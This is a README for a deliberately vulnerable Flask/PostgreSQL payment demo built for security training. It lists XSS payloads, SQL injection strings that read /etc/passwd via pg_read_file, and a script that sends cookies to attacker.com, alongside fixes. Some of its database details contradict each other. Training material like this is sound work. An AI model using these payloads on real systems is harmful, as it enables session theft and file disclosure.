# 🎯 Typo Payments - Security Vulnerability Demo

A **deliberately vulnerable** web application for demonstrating multiple security vulnerabilities. This application simulates a fictional payment processing company called "Typo" and contains:

- **Reflected XSS** (Cross-Site Scripting)
- **Stored XSS** (Persistent XSS)
- **SQL Injection** with PostgreSQL file reading
- **Session Cookie Hijacking**
- **Admin Privilege Escalation**

⚠️ **WARNING**: This application is intentionally insecure and should **NEVER** be deployed to production or exposed to the internet. Use only in controlled environments for security training and demonstrations.

## 🐘 PostgreSQL Migration

**NEW**: This application now runs on **PostgreSQL** instead of SQLite, enabling advanced SQL injection demonstrations including:
- ✅ File system access via `pg_read_file()`
- ✅ Professional database enumeration with `information_schema`
- ✅ Advanced attack chains
- ✅ Real-world database security scenarios

See **[POSTGRES_MIGRATION.md](docs/POSTGRES_MIGRATION.md)** for full details.

## 🎓 Educational Purpose

This demo helps developers understand:
- How XSS attacks work in real-world applications
- The difference between Reflected XSS and Stored XSS
- How SQL injection enables file reading in PostgreSQL
- How to chain vulnerabilities for maximum impact
- How session cookies can be stolen using XSS
- Why database choice matters for security
- Why input sanitization and output encoding are critical
- The importance of HttpOnly cookies and Content Security Policy

## 🚀 Quick Start

### Docker (Recommended!)

**Prerequisites**: Docker and Docker Compose installed

```bash
# Start everything (PostgreSQL + Flask app)
docker compose up -d

# View logs
docker logs -f typo-payments-demo

# Stop everything
docker compose down
```

Then open: **http://localhost:5000**

**Demo Accounts:**
- Regular User: `alice` / `password123`
- Regular User: `bob` / `password123`
- Administrator: `admin` / `admin123`

### 🔥 Quick SQL Injection Test

1. Login as Alice
2. Go to Status page
3. Try: `?id=1 OR 1=1` (see all payments)
4. Try: `?id=1 UNION SELECT 1, version(), 3, 4, 5, 6, 7` (PostgreSQL version)
5. Try: `?id=1 UNION SELECT 1, 2, 3, pg_read_file('/etc/passwd'), 5, 6, 7` (read files!)

**See [QUICK_REFERENCE.md](QUICK_REFERENCE.md) for top payloads and demo script.**

---

### Local Python Installation (Without Docker)

**Prerequisites**: PostgreSQL installed locally

**Installation Steps**:

1. **Clone or navigate to the project directory**
   ```bash
   cd vuln_slam_demo
   ```

2. **Create a virtual environment (recommended)**
   ```bash
   python3 -m venv venv
   source venv/bin/activate  # On macOS/Linux
   # On Windows: venv\Scripts\activate
   ```

3. **Install dependencies**
   ```bash
   pip install -r requirements.txt
   ```

4. **Initialize the database**
   ```bash
   python init_db.py
   ```

5. **Run the application**
   ```bash
   python app.py
   ```

6. **Access the application**
   Open your browser and go to: `http://localhost:5000`

## 👥 Demo Accounts

The application comes with pre-configured demo accounts:

| Username | Password | Role |
|----------|----------|------|
| alice | password123 | User |
| bob | password123 | User |
| admin | admin123 | Admin (full privileges) |

**Admin Features:**
- Access to admin dashboard
- View all users in the system
- Create new user accounts
- Grant/revoke admin privileges to other users
- Delete user accounts

## 🐛 Vulnerabilities Demonstrated

### 1. Reflected XSS (Non-Persistent)

The application has **two reflected XSS vulnerabilities**:

#### A. Search Page (`/search`)
**Location**: Search functionality  
**Vulnerable Parameter**: `q` (query parameter)

**Attack Examples**:
```
/search?q=<script>alert('XSS')</script>
/search?q=<img src=x onerror=alert(document.cookie)>
/search?q=<svg/onload=alert('XSS')>
```

**How to Demo**:
1. Log in with any demo account
2. Navigate to the "Search" page
3. Enter one of the payloads above in the search box
4. The script will execute immediately when the search results load

### 2. Stored XSS (Persistent)

**Location**: Feedback page (`/feedback`)  
**Vulnerable Field**: Feedback message textarea

**Attack Examples**:
```html
<script>alert('Stored XSS')</script>
<img src=x onerror=alert('Cookie: ' + document.cookie)>
<iframe src="javascript:alert('XSS')"></iframe>
<svg/onload=alert('Persistent XSS')>
```

**How to Demo**:
1. Log in with any demo account
2. Navigate to the "Feedback" page
3. Submit feedback with malicious JavaScript
4. The script is stored in the database
5. **Every user** who visits the feedback page will execute the script
6. Log in as a different user to see the attack affect multiple users

**Advanced Attack - Session Hijacking**:
```html
<script>
fetch('http://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    user: 'compromised'
  })
});
</script>
```

### 3. Insecure Session Management

**Vulnerability**: Session cookies are not HttpOnly  
**Config Line**: `app.config['SESSION_COOKIE_HTTPONLY'] = False`

**How to Demo**:
1. Log in to the application
2. Navigate to the Profile page
3. Click "Show Cookies" button
4. JavaScript can access the session cookie
5. This makes session hijacking via XSS possible

**View Cookies via Console**:
```javascript
console.log(document.cookie);
```

## 🔐 Security Issues Summary

| Issue | Type | Location | Impact |
|-------|------|----------|--------|
| No input sanitization | Reflected XSS | `/search` | Immediate script execution |
| No output encoding | Stored XSS | `/feedback` | Persistent attacks affecting all users |
| HttpOnly disabled | Session Management | All pages | Cookies accessible via JavaScript |
| No CSRF protection | CSRF | All forms | Forms can be submitted from external sites |
| No authorization checks | Broken Access Control | Admin functions | Users could potentially bypass admin checks |

## 🛡️ Admin Panel Features

The application includes a full admin panel to demonstrate privilege escalation scenarios:

### Admin Capabilities
- **Dashboard**: Overview of system statistics (users, payments, feedback)
- **User Management**: View all registered users
- **User Creation**: Create new accounts with or without admin privileges
- **Permission Management**: Grant or revoke admin rights to any user
- **User Deletion**: Remove users and their associated data

### Admin Routes
- `/admin` - Admin dashboard
- `/admin/users` - View and manage all users
- `/admin/create-user` - Create new user accounts
- `/admin/toggle-admin/<user_id>` - Toggle admin status (POST)
- `/admin/delete-user/<user_id>` - Delete a user (POST)

### Security Considerations for Demos
The admin system demonstrates:
- Role-based access control (RBAC)
- Authorization decorators (`@admin_required`)
- Self-protection (can't delete yourself or remove your own admin rights)
- However, still vulnerable to XSS attacks that could steal admin sessions!

## 🛡️ How to Fix These Vulnerabilities

### Fix 1: Input Validation & Output Encoding
```python
# In templates, remove |safe filter
{{ query }}  # Instead of {{ query|safe }}

# Or use escape() in Python
from markupsafe import escape
return render_template('search.html', query=escape(query))
```

### Fix 2: Enable HttpOnly Cookies
```python
# In app.py
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True  # For HTTPS
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
```

### Fix 3: Content Security Policy (CSP)
```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

### Fix 4: Use a Sanitization Library
```python
import bleach

def sanitize_input(text):
    return bleach.clean(text, strip=True)
```

## 🎬 Demo Script

### Part 1: Reflected XSS Demo (5 minutes)

1. **Explain the vulnerability**
   - Show the search page
   - Explain that user input is directly rendered without sanitization

2. **Simple Alert Demo**
   - Search for: `<script>alert('XSS')</script>`
   - Show the alert popup

3. **Cookie Stealing Demo**
   - Search for: `<img src=x onerror=alert(document.cookie)>`
   - Show the session cookie in the alert
   - Explain how an attacker could send this to their server

4. **Show the vulnerable code**
   - Open `templates/search.html`
   - Point out the `{{ query|safe }}` line
   - Explain how `|safe` disables auto-escaping

### Part 2: Stored XSS Demo (5 minutes)

1. **Explain the vulnerability**
   - Navigate to the Feedback page
   - Explain that feedback is stored in database without sanitization

2. **Create a persistent attack**
   - Submit feedback: `<script>alert('This will affect everyone!')</script>`
   - Show that the alert fires

3. **Demonstrate persistence**
   - Log out and log in as a different user
   - Navigate to Feedback page
   - Show that the alert still fires for the new user

4. **Show the vulnerable code**
   - Open `templates/feedback.html`
   - Point out the `{{ item.message|safe }}` line
   - Explain the database storage without sanitization

### Part 3: Session Hijacking (5 minutes)

1. **Show insecure cookies**
   - Navigate to Profile page
   - Click "Show Cookies"
   - Show the session cookie value

2. **Explain the attack**
   - Demonstrate how XSS + non-HttpOnly cookies = session hijacking
   - Show how an attacker could use the stolen cookie

3. **Show the fix**
   - Open `app.py`
   - Show the vulnerable config line
   - Explain how to enable HttpOnly

### Part 4: Admin Features & Privilege Escalation (5 minutes)

1. **Show admin access**
   - Log in as `admin` / `admin123`
   - Navigate to the Admin Dashboard via the 🛡️ Admin link

2. **Demonstrate user management**
   - View all registered users
   - Show stats on the dashboard
   - Create a new user account
   - Grant admin privileges to a regular user (e.g., Alice)

3. **Demonstrate privilege escalation scenario**
   - Log out and log back in as Alice
   - Show that Alice now has access to the admin panel
   - Demonstrate that Alice can now create users and manage permissions

4. **Show potential attack vector**
   - Explain that if an attacker steals an admin's session cookie via XSS
   - They would have full admin privileges
   - Could create backdoor accounts with admin rights
   - Demonstrate by using stored XSS on feedback page to steal admin cookie

## 📝 Additional Notes

- The application also contains an SQL injection vulnerability in the search functionality (bonus!)
- All passwords are hashed using Werkzeug's security functions
- The database is SQLite and stored as `typo_payments.db`
- Each user has sample payment data for realistic demonstration

## 🧹 Cleanup

To reset the database:
```bash
rm typo_payments.db
python init_db.py
```

Or use the reset script:
```bash
python reset_db.py
```

## 📚 Resources

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Flask Security Best Practices](https://flask.palletsprojects.com/en/latest/security/)

## ⚖️ License

This project is for educational purposes only. Use responsibly and ethically.

---

**Remember**: Never use these techniques maliciously. Understanding vulnerabilities helps build more secure applications! 🔒
